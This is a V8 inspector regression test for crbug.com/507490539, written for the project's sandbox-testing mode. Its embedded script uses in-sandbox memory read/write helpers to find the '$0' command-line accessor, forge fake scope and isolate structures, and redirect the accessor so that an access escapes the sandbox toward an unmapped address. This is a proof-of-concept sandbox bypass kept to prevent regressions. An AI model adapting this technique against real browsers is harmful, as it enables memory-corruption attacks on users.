// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

const {session, contextGroup, Protocol} =
    InspectorTest.start('Regression test for crbug.com/507490539');

const expression = String.raw`
const print = (...args) => {};
const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function r32(addr) {
  return mem.getUint32(addr >>> 0, true);
}

function w32(addr, value) {
  mem.setUint32(addr >>> 0, value >>> 0, true);
}

function w64(addr, value) {
  mem.setBigUint64(addr >>> 0, BigInt(value), true);
}

function raw(obj) {
  return Sandbox.getAddressOf(obj) >>> 0;
}

function hex32(value) {
  return "0x" + (value >>> 0).toString(16);
}

function hex64(value) {
  return "0x" + BigInt(value).toString(16);
}

function full(offset) {
  return BigInt(Sandbox.base) + BigInt(offset >>> 0);
}

function objectFromTagged(tagged) {
  return Sandbox.getObjectAt(((tagged >>> 0) - 1) >>> 0);
}

function offsetFromTagged(tagged) {
  return ((tagged >>> 0) - 1) >>> 0;
}

function typeOfTagged(tagged) {
  return Sandbox.getInstanceTypeOfObjectAt(offsetFromTagged(tagged));
}

function sizeOfTagged(tagged) {
  return Sandbox.getSizeOfObjectAt(offsetFromTagged(tagged));
}

function isTaggedHeapObject(tagged) {
  return (tagged & 1) === 1 &&
      tagged !== 0x11 &&
      Sandbox.isValidObjectAt(offsetFromTagged(tagged));
}

const kFixedArrayLengthShift = (() => {
  const probe = [{}];
  const probeBase = raw(probe);
  for (let off = 0; off < 32; off += 4) {
    const tagged = r32(probeBase + off);
    if (!isTaggedHeapObject(tagged)) continue;
    if (typeOfTagged(tagged) !== "FIXED_ARRAY_TYPE") continue;
    const rawLength = r32(offsetFromTagged(tagged) + 4);
    if (rawLength === 1 || rawLength === 2) return rawLength === 2 ? 1 : 0;
  }
  throw new Error("could not infer FixedArray length encoding");
})();

function fixedArrayLength(base) {
  return r32(base + 4) >>> kFixedArrayLengthShift;
}

function findGlobalObjectOffset() {
  const globalProxyMap = (r32(raw(globalThis)) - 1) >>> 0;
  return offsetFromTagged(r32(globalProxyMap + 16));
}

function findCommandLineAccessorInfo(name) {
  const globalObject = findGlobalObjectOffset();
  const dictionaryTagged = r32(globalObject + 4);
  const dictionary = objectFromTagged(dictionaryTagged);
  const base = offsetFromTagged(dictionaryTagged);
  const size = sizeOfTagged(dictionaryTagged);

  for (let off = 0; off < size; off += 4) {
    const cellTagged = r32(base + off);
    if (!isTaggedHeapObject(cellTagged)) continue;

    if (typeOfTagged(cellTagged) !== "PROPERTY_CELL_TYPE") continue;
    const cellBase = offsetFromTagged(cellTagged);
    const nameTagged = r32(cellBase + 4);
    const valueTagged = r32(cellBase + 12);
    if (!isTaggedHeapObject(nameTagged) || !isTaggedHeapObject(valueTagged)) {
      continue;
    }

    const keyType = typeOfTagged(nameTagged);
    if (!keyType.includes("STRING")) continue;
    const key = objectFromTagged(nameTagged);
    if (String(key) !== name) continue;

    const valueType = typeOfTagged(valueTagged);
    if (valueType !== "ACCESSOR_INFO_TYPE") {
      throw new Error(name + " did not resolve to AccessorInfo: " + valueType);
    }
    return {accessorInfo: offsetFromTagged(valueTagged), nameTagged, key};
  }

  throw new Error("could not find command-line API accessor " + name);
}

function findArrayElements(jsArray, predicate) {
  const base = raw(jsArray);
  for (let off = 0; off < 32; off += 4) {
    const tagged = r32(base + off);
    if (!isTaggedHeapObject(tagged)) continue;
    if (typeOfTagged(tagged) !== "FIXED_ARRAY_TYPE") continue;
    const objBase = offsetFromTagged(tagged);
    const length = fixedArrayLength(objBase);
    const first = length > 0 ? r32(objBase + 8) : 0;
    if (!predicate || predicate({tagged, offset: objBase, off, length, first})) {
      return {tagged, offset: objBase, off, length, first};
    }
  }
  throw new Error("could not find JSArray elements");
}

function chooseUnmappedTarget() {
  const sandboxBase = BigInt(Sandbox.base);
  const sandboxEnd = sandboxBase + BigInt(Sandbox.byteLength);
  const candidates = [
    0x414141410000n,
    0x515151510000n,
    0x626262620000n,
    0x6d6d6d6d0000n,
  ];

  for (const candidate of candidates) {
    if (candidate >= sandboxBase && candidate < sandboxEnd) continue;
    return candidate;
  }
  throw new Error("could not choose an out-of-sandbox target");
}

for (let i = 0; i < 200; i++) {
  findCommandLineAccessorInfo("$0");
}
const {accessorInfo, nameTagged, key} = findCommandLineAccessorInfo("$0");

const methodsCarrier = [key];
const methodsElements = findArrayElements(
    methodsCarrier, ({length, first}) => length > 0 && first === nameTagged);
isTaggedHeapObject((methodsElements.offset + 8) | 1);

const holder = {};
const arenaCarrier = new Array(512).fill(holder);
const arenaElements = findArrayElements(
    arenaCarrier, ({length}) => length >= 512);
const arena = (arenaElements.offset + 8) >>> 0;

const fakeScope = arena;
const fakeIsolate = (arena + 0x100) >>> 0;
const methodsGlobalSlot = (arena + 0x380) >>> 0;
const fakeData = new ArrayBuffer(8);
const target = chooseUnmappedTarget();

w64(methodsGlobalSlot, full(methodsElements.tagged));

w64(fakeScope + 0x00, full(fakeIsolate));
w64(fakeScope + 0x20, full(methodsGlobalSlot));

w64(fakeIsolate + 0x230, target);
w64(fakeIsolate + 0x238, target + 0x100n);

new DataView(fakeData).setBigUint64(0, full(fakeScope), true);

print("accessorInfo=" + hex32(accessorInfo));
print("nameTagged=" + hex32(nameTagged));
print("methodsElements=" + hex32(methodsElements.offset) +
      " length=" + methodsElements.length);
print("arena=" + hex32(arena));
print("fakeScope=" + hex64(full(fakeScope)));
print("fakeIsolate=" + hex64(full(fakeIsolate)));
print("target=" + hex64(target));

w32(accessorInfo + 4, (raw(fakeData) + 1) >>> 0);

globalThis.$0 = 13;
`;

(async () => {
  await Protocol.Runtime.evaluate({
    includeCommandLineAPI: true,
    expression,
  });
  InspectorTest.completeTest();
})();
